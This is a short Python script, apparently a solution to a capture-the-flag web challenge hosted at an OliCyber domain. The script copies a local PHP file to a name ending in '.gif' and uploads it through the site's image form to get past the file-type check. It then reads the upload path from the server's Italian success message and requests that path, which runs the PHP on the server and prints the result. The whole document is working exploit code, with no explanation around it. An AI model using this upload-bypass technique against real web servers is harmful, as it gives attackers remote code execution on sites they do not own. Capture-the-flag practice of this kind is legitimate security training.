import requests, os, shutil

PATH = os.path.dirname(os.path.realpath(__file__))
PHP = 'kitten.php'
GIF = PHP + '.gif'
# os.replace(PATH + '\\' + PHP, PATH + '\\' + GIF)
shutil.copyfile(PATH + '\\' + PHP, PATH + '\\' + GIF)

with open(PATH + '\\' + GIF,'rb') as img:
  r = requests.post(
    'http://got-magic.challs.olicyber.it/',
    files={'image':img},
    data={'submit':'Upload'}
  )


UPLOAD_PATH = r.text.split('</br>Il file ')[1].split(' è stato caricato correttamente')[0]
print(UPLOAD_PATH)

r1 = requests.get(
  f'http://got-magic.challs.olicyber.it/{UPLOAD_PATH}'
)
print(r1.text)

